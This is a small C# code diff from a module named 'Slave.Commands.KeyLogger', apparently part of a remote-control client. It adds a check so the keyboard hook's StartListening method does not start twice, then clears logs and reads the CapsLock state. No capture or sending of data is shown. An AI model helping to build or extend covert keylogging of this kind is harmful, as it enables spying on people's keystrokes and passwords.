@@ -39,6 +39,9 @@ namespace Slave.Commands.KeyLogger
         /// </summary>
         public void StartListening()
         {
+            // There is no need to start listening again
+            if (keyboardHook.listening) return;
+
             logger.ClearLogs();
 
             capsState = Control.IsKeyLocked(Keys.CapsLock);
